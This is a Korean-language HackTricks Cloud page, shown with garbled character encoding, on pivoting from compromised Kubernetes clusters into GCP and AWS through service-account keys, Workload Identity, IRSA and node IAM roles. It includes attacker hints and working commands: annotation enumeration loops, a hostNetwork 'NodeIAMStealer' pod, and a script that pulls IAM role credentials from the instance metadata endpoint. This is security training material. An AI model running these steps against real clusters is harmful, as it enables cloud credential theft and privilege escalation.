# Kubernetes Pivoting to Clouds

{% hint style="success" %}
AWS í•´í‚¹ì„ ë°°ìš°ê³  ì‹¤ìŠµí•˜ì„¸ìš”: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ì„ ë°°ìš°ê³  ì‹¤ìŠµí•˜ì„¸ìš”: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## GCP

ë§Œì•½ GCP ë‚´ì—ì„œ k8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ ì•„ë§ˆë„ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì–´ë–¤ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ GCPì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•  ê²ƒì…ë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” ë°ëŠ” ì¼ë°˜ì ìœ¼ë¡œ ë‘ ê°€ì§€ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤:

### Secretìœ¼ë¡œ GCP-SA í‚¤ ë§ˆìš´íŠ¸

**kubernetes ì• í”Œë¦¬ì¼€ì´ì…˜ì— GCP ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬**í•˜ëŠ” ì¼ë°˜ì ì¸ ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* GCP ì„œë¹„ìŠ¤ ê³„ì • ìƒì„±
* ì›í•˜ëŠ” ê¶Œí•œì„ í• ë‹¹
* ìƒì„±ëœ SAì˜ json í‚¤ ë‹¤ìš´ë¡œë“œ
* pod ë‚´ì—ì„œ ì‹œí¬ë¦¿ìœ¼ë¡œ ë§ˆìš´íŠ¸
* jsonì´ ìˆëŠ” ê²½ë¡œë¥¼ ê°€ë¦¬í‚¤ëŠ” GOOGLE\_APPLICATION\_CREDENTIALS í™˜ê²½ ë³€ìˆ˜ ì„¤ì •

{% hint style="warning" %}
ë”°ë¼ì„œ, **ê³µê²©ì**ë¡œì„œ, pod ë‚´ì˜ ì»¨í…Œì´ë„ˆë¥¼ compromiseí•˜ë©´ í•´ë‹¹ **env ë³€ìˆ˜** ë° GCP ìê²© ì¦ëª…ì´ ìˆëŠ” **json íŒŒì¼**ì„ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### GSA jsonì„ KSA ì‹œí¬ë¦¿ì— ì—°ê²°

GSAì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ì´ GSAë¥¼ GKE í´ëŸ¬ìŠ¤í„°ì— ë°”ì¸ë”©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:

* ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ GKE í´ëŸ¬ìŠ¤í„°ì™€ ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì„ ìƒì„±í•˜ì„¸ìš”:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ `gcloud` ëª…ë ¹ì¤„ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ GKE í´ëŸ¬ìŠ¤í„°ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ë ¤ëŠ” GCP ì„œë¹„ìŠ¤ ê³„ì •ì˜ ìê²© ì¦ëª…ì„ í¬í•¨í•˜ëŠ” Kubernetes Secretì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ Kubernetes ì‹œí¬ë¦¿ì„ Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ì— ë°”ì¸ë”©í•˜ì‹­ì‹œì˜¤:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**ë‘ ë²ˆì§¸ ë‹¨ê³„**ì—ì„œëŠ” **GSAì˜ ìê²© ì¦ëª…ì„ KSAì˜ ë¹„ë°€ë¡œ ì„¤ì •**í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, **GKE í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì—ì„œ í•´ë‹¹ ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆë‹¤ë©´**, í•´ë‹¹ GCP ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ **ìŠ¤ì¼€ì¼ ì—…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### GKE Workload Identity

Workload Identityë¥¼ ì‚¬ìš©í•˜ë©´ [Kubernetes ì„œë¹„ìŠ¤ ê³„ì •](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)ì„ [Google ì„œë¹„ìŠ¤ ê³„ì •](https://cloud.google.com/iam/docs/understanding-service-accounts)ìœ¼ë¡œ ì‘ë™í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Kubernetes ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” PodëŠ” Google Cloud APIì— ì•¡ì„¸ìŠ¤í•  ë•Œ ìë™ìœ¼ë¡œ Google ì„œë¹„ìŠ¤ ê³„ì •ìœ¼ë¡œ ì¸ì¦ë©ë‹ˆë‹¤.

ì´ ë™ì‘ì„ í™œì„±í™”í•˜ë ¤ë©´ **GCPì—ì„œ Workload Identityë¥¼ í™œì„±í™”**í•˜ê³  k8sê°€ í‰ë‚´ ë‚´ê¸°ë¥¼ ì›í•˜ëŠ” GCP SAë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤.

* ìƒˆ í´ëŸ¬ìŠ¤í„°ì—ì„œ **Workload Identity í™œì„±í™”**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **ìƒˆ ë…¸ë“œ í’€ ìƒì„±/ì—…ë°ì´íŠ¸** (Autopilot í´ëŸ¬ìŠ¤í„°ëŠ” ì´ ì‘ì—…ì´ í•„ìš”í•˜ì§€ ì•ŠìŒ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8sì—ì„œ GCP ê¶Œí•œì„ ê°€ì§„ **GCP ì„œë¹„ìŠ¤ ê³„ì •ì„ í‘œí˜„**í•˜ë„ë¡ ë§Œë“­ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **í´ëŸ¬ìŠ¤í„°**ì— **ì—°ê²°**í•˜ê³  ì‚¬ìš©í•  **ì„œë¹„ìŠ¤ ê³„ì •**ì„ **ìƒì„±**í•©ë‹ˆë‹¤.

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSAì™€ KSAë¥¼ ë°”ì¸ë”©(bind)í•©ë‹ˆë‹¤** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**ì™€ í•¨ê»˜ **pod**ë¥¼ ì‹¤í–‰í•˜ê³  **GSA**ì— ëŒ€í•œ **ì•¡ì„¸ìŠ¤**ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ í•„ìš”í•œ ê²½ìš° ì¸ì¦ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s ë‚´ë¶€ì˜ ê³µê²©ìë¡œì„œëŠ” SAë¥¼ ê²€ìƒ‰í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë•Œ SAì— `iam.gke.io/gcp-service-account` ì£¼ì„ì´ ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ì£¼ì„ì´ ìˆë‹¤ë©´ SAê°€ GCPì—ì„œ ë¬´ì–¸ê°€ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ê° KSAë¥¼ ë‚¨ìš©í•˜ê³  ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
GCPì—ì„œëŠ” í•­ìƒ ë°”ì¸ë”©ì„ ì—´ê±°í•˜ê³  Kubernetes ë‚´ë¶€ì˜ SAì—ê²Œ ì–´ë–¤ ì•¡ì„¸ìŠ¤ë¥¼ ë¶€ì—¬í•˜ëŠ”ì§€ íŒŒì•…í•˜ëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë‹¤ìŒì€ **ëª¨ë“  pod ì •ì˜ë¥¼ ë°˜ë³µ**í•˜ë©´ì„œ í•´ë‹¹ **ì£¼ì„ì„ ì°¾ëŠ”** ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role for Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Podsì— IAM ì—­í• ì„ ë¶€ì—¬í•˜ëŠ” (ì˜¤ë˜ëœ) ë°©ë²•ì€ [**Kiam**](https://github.com/uswitch/kiam) ë˜ëŠ” [**Kube2IAM**](https://github.com/jtblin/kube2iam) **ì„œë²„**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ **íŠ¹ê¶Œ IAM ì—­í• **ì„ ê°€ì§„ **ë°ëª¬ì…‹**ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ë°ëª¬ì…‹ì€ í•„ìš”í•œ íŒŸì— IAM ì—­í• ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë„ë¡ ì œê³µí•  ê²ƒì…ë‹ˆë‹¤.

ë¨¼ì € **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ì—­í• ì„ êµ¬ì„±**í•´ì•¼ í•˜ë©°, ì´ë¥¼ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê°ì²´ ë‚´ì˜ ì£¼ì„ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•©ë‹ˆë‹¤:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

ë„¤ì„ìŠ¤í˜ì´ìŠ¤ê°€ IAM ì—­í• ë¡œ êµ¬ì„±ëœ í›„ì—ëŠ” Podsê°€ ê°–ê²Œ ë  ìˆ˜ ìˆëŠ” ì—­í• ì„ ê° Pod ì •ì˜ì— ì›í•˜ëŠ” ì—­í• ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ, ë§Œì•½ **ì´ëŸ¬í•œ ì£¼ì„ë“¤ì„** podsë‚˜ namespacesì—ì„œ ì°¾ê±°ë‚˜ kiam/kube2iam ì„œë²„ê°€ ì‹¤í–‰ ì¤‘ì´ë¼ë©´ (ì•„ë§ˆë„ kube-systemì—) ì´ë¯¸ **podsì—ì„œ ì‚¬ìš©ëœ ëª¨ë“  ì—­í• ì„** ê·¸ë¦¬ê³  ë” ë§ì€ ê²ƒë“¤ì„ (AWS ê³„ì •ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ìˆë‹¤ë©´ ì—­í• ì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŒ) **ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

#### IAM ì—­í• ì„ ì‚¬ìš©í•˜ì—¬ Pod ìƒì„±

{% hint style="info" %}
ì§€ì •í•´ì•¼ í•˜ëŠ” IAM ì—­í• ì€ kiam/kube2iam ì—­í• ê³¼ ë™ì¼í•œ AWS ê³„ì •ì— ìˆì–´ì•¼ í•˜ë©° í•´ë‹¹ ì—­í• ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

ì´ê²ƒì€ **AWSì—ì„œ ê¶Œì¥í•˜ëŠ” ë°©ë²•**ì…ë‹ˆë‹¤.

1. ë¨¼ì € í´ëŸ¬ìŠ¤í„°ì— [OIDC ê³µê¸‰ìë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. ê·¸ëŸ° ë‹¤ìŒ SAê°€ í•„ìš”ë¡œ í•˜ëŠ” ê¶Œí•œì„ ê°–ëŠ” IAM ì—­í• ì„ ìƒì„±í•©ë‹ˆë‹¤.
3. IAM ì—­í• ê³¼ SA ê°„ì— [ì‹ ë¢° ê´€ê³„ë¥¼ ìƒì„±í•©ë‹ˆë‹¤](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) (ë˜ëŠ” ì—­í• ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤). _ì‹ ë¢° ê´€ê³„ëŠ” ì£¼ë¡œ OIDC ê³µê¸‰ì ì´ë¦„, ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ì´ë¦„ ë° SA ì´ë¦„ì„ í™•ì¸í•©ë‹ˆë‹¤_.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ, **ì—­í• ì˜ ARNì„ ë‚˜íƒ€ë‚´ëŠ” ì£¼ì„ì´ ìˆëŠ” SAë¥¼ ìƒì„±**í•˜ê³  í•´ë‹¹ SAë¡œ ì‹¤í–‰ë˜ëŠ” íŒŸì€ **ì—­í• ì˜ í† í°ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **í† í°**ì€ **íŒŒì¼ ì•ˆì— ì“°ì—¬ì§€ë©°** ê²½ë¡œëŠ” **`AWS_WEB_IDENTITY_TOKEN_FILE`**ì— ì§€ì •ë©ë‹ˆë‹¤ (ê¸°ë³¸ê°’: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`).
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
**/var/run/secrets/eks.amazonaws.com/serviceaccount/token**ì—ì„œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ **awsë¥¼ ê°€ì ¸ì˜¤ë ¤ë©´** ë‹¤ìŒì„ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
ê³µê²©ìë¡œì„œ K8s í´ëŸ¬ìŠ¤í„°ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆë‹¤ë©´, **í•´ë‹¹ ì£¼ì„ì´ ìˆëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì„ í™•ì¸**í•˜ì—¬ **AWSë¡œ ìŠ¹ê²©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ IAM **íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì • ì¤‘ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•˜ì—¬** **íŒŸì„ ì‹¤í–‰/ìƒì„±**í•˜ì—¬ í† í°ì„ ë„ìš©í•˜ì‹­ì‹œì˜¤.

ë˜í•œ, íŒŸ ë‚´ë¶€ì— ìˆë‹¤ë©´ **AWS\_ROLE\_ARN** ë° **AWS\_WEB\_IDENTITY\_TOKEN**ê³¼ ê°™ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.
{% endhint %}

{% hint style="danger" %}
ê°€ë” **ì—­í• ì˜ ì‹ ë¢° ì •ì±…**ì´ **ì˜ëª» êµ¬ì„±**ë  ìˆ˜ ìˆìœ¼ë©°, ì˜ˆìƒëœ ì„œë¹„ìŠ¤ ê³„ì •ì— AssumeRole ì•¡ì„¸ìŠ¤ë¥¼ ë¶€ì—¬í•˜ëŠ” ëŒ€ì‹  **ëª¨ë“  ì„œë¹„ìŠ¤ ê³„ì •**ì— ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì œì–´ëœ ì„œë¹„ìŠ¤ ê³„ì •ì— ì£¼ì„ì„ ì‘ì„±í•  ìˆ˜ ìˆë‹¤ë©´ ì—­í• ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” **ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### í´ëŸ¬ìŠ¤í„° ë‚´ IAM ì—­í• ì„ ê°€ì§„ íŒŸ ë° ì„œë¹„ìŠ¤ ê³„ì • ì°¾ê¸°

ë‹¤ìŒì€ **ëª¨ë“  íŒŸ ë° ì„œë¹„ìŠ¤ ê³„ì •ì„ ìˆœíšŒ**í•˜ë©° í•´ë‹¹ **ì£¼ì„ì„ ì°¾ëŠ”** ìŠ¤í¬ë¦½íŠ¸ì…ë‹ˆë‹¤:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### ë…¸ë“œ IAM ì—­í• 

ì´ì „ ì„¹ì…˜ì€ íŒŒë“œë¡œ IAM ì—­í• ì„ ì–´ë–»ê²Œ ë„ìš©í•˜ëŠ”ì§€ì— ëŒ€í•œ ê²ƒì´ì—ˆì§€ë§Œ, **K8s í´ëŸ¬ìŠ¤í„°ì˜ ë…¸ë“œëŠ” í´ë¼ìš°ë“œ ë‚´ë¶€ì˜ ì¸ìŠ¤í„´ìŠ¤ê°€ ë  ê²ƒ**ì…ë‹ˆë‹¤. ì´ëŠ” ë…¸ë“œê°€ ìƒˆë¡œìš´ IAM ì—­í• ì„ ê°€ì§ˆ ê°€ëŠ¥ì„±ì´ ë§¤ìš° ë†’ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. (_ì¼ë°˜ì ìœ¼ë¡œ K8s í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œê°€ ë™ì¼í•œ IAM ì—­í• ì„ ê°€ì§€ë¯€ë¡œ ê° ë…¸ë“œë¥¼ í™•ì¸í•´ ë³¼ ê°€ì¹˜ê°€ ì—†ì„ ìˆ˜ë„ ìˆìŒì„ ìœ ì˜í•˜ì„¸ìš”_).

ê·¸ëŸ¬ë‚˜ ë…¸ë“œì—ì„œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ ë…¸ë“œì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤ (ssh ì„¸ì…˜?) ë˜ëŠ” ì ì–´ë„ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM ì—­í•  í† í° ë„ìš©

ì´ì „ì— ìš°ë¦¬ëŠ” **Podì— IAM ì—­í• ì„ ë¶€ì—¬í•˜ëŠ” ë°©ë²•**ì´ë‚˜ ì‹¬ì§€ì–´ **Nodeë¡œ ì´íƒˆí•˜ì—¬ ì¸ìŠ¤í„´ìŠ¤ì— ì—°ê²°ëœ IAM ì—­í• ì„ ë„ìš©í•˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ë…¼ì˜í–ˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡­ê²Œ ì–»ì€ **IAM ì—­í•  ìê²© ì¦ëª…ì„ ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## ì°¸ê³  ìë£Œ

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—™ ë ˆí¬ì§€í† ë¦¬ë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
{% endhint %}
